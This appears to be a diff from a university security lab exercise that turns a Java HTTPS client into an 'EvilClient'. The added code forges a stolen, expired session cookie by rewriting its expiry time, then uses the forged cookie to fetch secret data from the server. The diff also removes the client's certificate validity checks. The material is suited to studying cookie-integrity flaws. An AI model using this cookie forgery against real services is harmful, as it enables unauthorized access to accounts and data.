@@ -1,7 +1,6 @@
 package ch.fhnw.apsi.lab1;
 
 import java.io.BufferedReader;
-import java.io.DataOutputStream;
 import java.io.FileInputStream;
 import java.io.IOException;
 import java.io.InputStream;
@@ -13,10 +12,6 @@ import java.security.KeyStore;
 import java.security.KeyStoreException;
 import java.security.NoSuchAlgorithmException;
 import java.security.cert.CertificateException;
-import java.security.cert.CertificateExpiredException;
-import java.security.cert.CertificateNotYetValidException;
-import java.security.cert.X509Certificate;
-import java.util.List;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 
@@ -52,58 +47,23 @@ public class EvilClient {
     sslSocketFactory = sslContext.getSocketFactory();
   }
   
-  public String post(String input) throws IOException {
-    // post login credentials: mail address and password
-    // retrieve and store (in-memory) the cookie sent from the server for subsequent requests
+  public void tamperExpiredCookie(String expiredCookie) {
+    // tamper a (stolen) expired cookie by setting another expiration time
     
-    HttpURLConnection httpConnection = (HttpURLConnection) url.openConnection();
-    HttpsURLConnection securedConnection = (HttpsURLConnection) httpConnection;
-    securedConnection.setSSLSocketFactory(sslSocketFactory);
-    
-    securedConnection.setRequestMethod("POST");
-    securedConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
-    securedConnection.setRequestProperty("Content-Length", "" + Integer.toString(input.getBytes().length));
-    securedConnection.setUseCaches (false);
-    securedConnection.setDoInput(true);
-    securedConnection.setDoOutput(true);
-    securedConnection.connect();
-    
-    if (!checkCertificateValidity(securedConnection)) {
-      securedConnection.disconnect();
-      return "CERTIFICATE NOT VALID";
+    String[] cookieParts = expiredCookie.split("&");
+    String newCookie = "session=exp=" + (System.currentTimeMillis() / 1000 + 600);
+    for (int i=1;i<cookieParts.length;i++) {
+      newCookie = newCookie + "&" + cookieParts[i];
     }
-
-    DataOutputStream wr = new DataOutputStream (securedConnection.getOutputStream ());
-    wr.writeBytes (input);
-    wr.flush ();
-    wr.close ();
+    LOGGER.log(Level.INFO, "Tampering expirde cooke:");
+    LOGGER.log(Level.INFO, "expired cooke: "+expiredCookie);
+    LOGGER.log(Level.INFO, "new fake cooke: "+newCookie);
     
-    String cookie = "";
-    List<String> cookieFieldList = securedConnection.getHeaderFields().get("Set-cookie");
-    if (cookieFieldList != null) {
-      if (cookieFieldList.size()==1) {
-        cookie = cookieFieldList.get(0);
-      }
-    }
-    this.cookie = cookie;
-    LOGGER.log(Level.INFO, "Retrieved Cookie: " + cookie);
-
-    InputStream is = securedConnection.getInputStream();
-    BufferedReader br = new BufferedReader(new InputStreamReader(is));
-    String line;
-    StringBuffer response = new StringBuffer(); 
-    while((line = br.readLine()) != null) {
-      response.append(line);
-      response.append("\n");
-    }
-    br.close();
-    securedConnection.disconnect();
-    
-    return response.toString();
+    cookie = newCookie;
   }
   
-  public String get() throws IOException {
-    // get the secret information
+  public String tryToSnatchSecretInformation() throws IOException {
+    // try to get the secret information by constructing a 
     // authentication is achieved by showing the cookie retrieved from the server
     
     HttpURLConnection httpConnection = (HttpURLConnection) url.openConnection();
@@ -119,11 +79,6 @@ public class EvilClient {
     
     LOGGER.log(Level.INFO, "Sent Cookie: " + cookie);
     
-    if (!checkCertificateValidity(securedConnection)) {
-      securedConnection.disconnect();
-      return "CERTIFICATE NOT VALID";
-    }
-    
     InputStream is = securedConnection.getInputStream();
     BufferedReader br = new BufferedReader(new InputStreamReader(is));
     String line;
@@ -136,30 +91,5 @@ public class EvilClient {
     securedConnection.disconnect();
     
     return response.toString();
-  }
-  
-  private boolean checkCertificateValidity(HttpsURLConnection securedConnection) throws IOException {
-    // check validity of the server certificate
-    // make sure that the self-signed server certificate has not expired yet
-    // (matching address is being checked in the handshake automatically)
-    
-    java.security.cert.Certificate[] certificates = securedConnection.getServerCertificates();
-
-    if (certificates.length > 0) {      
-      X509Certificate certificate = (X509Certificate) certificates[0];
-    
-      try {
-        certificate.checkValidity();
-        return true;
-      } catch (CertificateExpiredException e) {
-        LOGGER.log(Level.INFO, "Certificate has expired");
-        return false;
-      } catch (CertificateNotYetValidException e) {
-        LOGGER.log(Level.INFO, "Certificate is not valid yet");
-        return false;
-      }
-    }
-    
-    return false;
   }
 }
